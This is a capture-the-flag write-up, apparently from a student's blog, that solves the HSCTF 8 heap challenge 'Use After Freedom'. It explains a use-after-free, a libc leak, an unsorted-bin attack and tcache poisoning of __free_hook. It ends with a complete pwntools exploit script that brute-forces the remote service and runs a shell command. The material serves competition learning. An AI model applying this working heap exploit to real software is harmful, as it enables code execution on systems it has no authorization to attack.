---
layout: post
title: HSCTF 8 - Use After Freedom
---
b1c + rogue waves gets 2nd globally in HSCTF 8!

We got first in high school teams, meaning we beat the redpwn teams once again!!!

I didn't really do a lot besides the pwnables, only one or two extra challenges.

## Use After Freedom
This challenge is made by poortho, meaning it is guaranteed to be a GLibc heap exploitation challenge.

Checksec returns:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Upon running the program, we are allowed to:
```
1. Obtain some freedom
2. Lose some freedom
3. Change some freedom
4. View some freedom
5. Exit
```

The provided libc is 2.27.

<!-- more -->

### analysis

There is a global array containing pointers to chunks that we have allocated. We are only given 5 allocations, which is very tight.

Obtaining freedom means allocating an arbitrary sized chunk, size <= 0x10000. We also get to write a corresponding amount of bytes to the chunk.

Losing freedom means freeing a chunk. With respect to the name of the challenge, the free function does not null out the pointer to the chunk in the array, creating a UAF.

Changing freedom means editing a chunk. We can write a maximum of 0x18 bytes to any chunk through this method.

Viewing freedom means calling `puts` on the chunk. This basically prints out the contents of the chunk until a null byte is reached.

Additionally, allocating chunks calls a custom malloc wrapper. This wrapper ensures that all pointers returned by `malloc` are between a lower bound of the start of allocatable chunks on the heap (we can't modify the first chunk, the tcache perthread struct) and an upper bound of `0x600000000000`.


### leaking libc address
Using our UAf created by the free function, we can:
- Allocate a 0x500 sized chunk
- Allocated a 0x30 sized chunk
- Free the 0x500 chunk
- View the 0x500 chunk

When freeing the 0x500 chunk, it will not be able to be merged back with the top of the heap (the 0x30 is in the way) so it will go into the unsorted bin. The unsorted bin writes libc pointers to chunks that are placed into it. So, viewing it will leak a libc address.

### tcache poisoning, and why it won't work
Typically, with a easy UAF and a libc address, writing `system` to `__free_hook` is very easy.

Simply free a chunk into the tcache, and point it to an address you want to write to. The next allocation of the same size will return the original chunk, and then the next allocation will return a pointer to where you want to write. In our case, we want to write to one of the hooks, preferably `__free_hook`.

However, `__free_hook` is at a libc address.

The custom malloc prevents us from doing this. The Ghidra decomp is:
```c
void * custom_malloc(int size)

{
  void *chunk;

  chunk = malloc((long)size);
  if ((chunk <= max_address) && (start_chunk <= chunk)) {
    return chunk;
  }
  puts("Memory corruption detected!");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

`max_address` and `start_chunk` are global variables.

Recall that `max_address` is hardcoded to be `0x600000000000`. However, libc addresses typically are past `0x7f0000000000`. So, the custom malloc aborts and we don't get to write.

### unsorted bin attack
The next step that seemed most plausible would be to write to `max_address` to allow writing to libc addresses.

All I need is to write a large value to `max_address`; I don't really care what it is, exactly. Fortunately, an attack exists using the unsorted bins.

We can modify the `bck` pointer of a chunk inside the unsorted bins using our UAF. If we allocate back the entire chunk, it will write a libc pointer to our address + 0x10.

With some careful tweaking, we can overwrite `max_address` to be so large that we can allocate chunks at libc addresses using our tcache poison.

### :galaxybrain:
The binary has PIE enabled. Global variables, such as `max_address`, are at randomized addresses. So, I had to look for ways to leak it.

I was stuck here for a long time. I came up with a lot of cool solutions that unfortunately didn't work due to restrictions (but you might see in a CTF I write for!).

I had spent nearly a day and a half on this. I was growing impatient.

Finally, I resigned myself to the patented perfect blue strategy: brute force.
```
JoshDaBosh — Yesterday at 1:21 PM
hmmmm
12 bit brute force is looking real sexy right about now
```

I noticed that the heap base address seemed pretty close to the base text address of the binary (where the global variables are). So, I developed an ingenious plan of hardcoding an offset from a heap address and just running the program until I got lucky with an overwrite.

The plan is:
- Free the 0x30 chunk from our unsorted bin leak
- Edit the 0x30 chunk's `key` value (at +0x8) so that the tcache will not detect a double free
- Free the 0x30 chunk again
- View the 0x30 chunk

This will spit out a heap pointer. The offset between this address and `max_address` varies, but I used gdb during testing and manually subtracted.

I also added 1 to the final address just to make sure that `max_address` was sufficiently large. This means instead of `max_value` being `0x00007fxxxxxxxxxx` (normal libc address) after the write, it is `0x007fxxxxxxxxxx00` (left shifted by 16 bits). Thus, `max_value` will always be bigger than ANY libc address.

Next, to use an unsorted bin attack:
- Edit the `bck` pointer of our 0x500 chunk to point to the desired address - 0x10
- Allocate back the entire 0x500 chunk

Now, our `max_address` will be changed to a very large value.

From here, a tcache poison is very easy. We can just edit the fwd of our freed 0x30 chunk to point to `__free_hook`. Two more allocs sized 0x30, and we write `system` to the second.

This uses all 5 of the allocs that we are given.

### script
Thankfully the proof-of-work was disabled.

In one run, the offset was `0xf93760`. So I decided to keep it.

```python
from pwn import *
from time import sleep

e = ELF("./use_after_freedom")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e
context.terminal = ["konsole", "-e"]

def add(sz, d):
    p.sendlineafter(">", "1")
    p.sendlineafter(">", str(sz))
    p.sendafter(">", d)


def delete(idx):
    p.sendlineafter(">", "2")
    p.sendlineafter(">", str(idx))


def edit(idx, d):
    p.sendlineafter(">", "3")
    p.sendlineafter(">", str(idx))
    p.sendafter(">", d)


def view(idx):
    p.sendlineafter(">", "4")
    p.sendlineafter(">", str(idx))


while True:
    #p = process([e.path])
    try:
        p = remote("use-after-freedom.hsc.tf", 1337)
    except pwnlib.exception.PwnlibException:
        sleep(2)
        continue

    context.log_level="debug"
    #gdb.attach(p, """c""")

    p.recvuntil("Exit")


    add(0x500, "AAAA")
    add(0x30, "/bin/sh")

    delete(0)
    view(0)

    p.recv(1)

    libc.address = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0

    print("libc", hex(libc.address))
    print("main arena ptr", hex(libc.address + 0x3ebca0))
    print("system", hex(libc.sym["system"]))
    print("need to leek", hex(libc.address + 0x3eaf40))
    print("asdf", hex(libc.sym["global_max_fast"]))


    delete(1)

    edit(1, "A"*16)

    delete(1)

    view(1)

    p.recv(1)

    heap = u64(p.recv(6).ljust(8, "\x00"))

    print(hex(heap))

    offset = 0xf93760 #input()

    edit(0, "a"*8 + p64(heap - offset - 0x10 + 1))

    try:
        add(0x500, "BBBB")
    except EOFError:
        p.close()
        #p.kill()
        continue

    edit(1, p64(libc.sym["__free_hook"]))

    add(0x30, "/bin/sh")

    gdb.attach(p)

    try:
        add(0x30, p64(libc.sym["system"]))
        delete(3)
        p.sendline("cat flag")
        break
    except:
        p.close()
        #p.kill()
        continue

p.interactive()
```

Now it is a matter of luck as to when you get the flag. I had an appointment so I gave the script to my teammates. One of them got the flag very quickly. My later run took more than an hour (I think; I was watching a movie while it ran).

Flag: `flag{ok_but_why_is_global_max_fast_even_writeable}`

```
poortho — Yesterday at 5:23 PM
u dont deserve actual solution
```
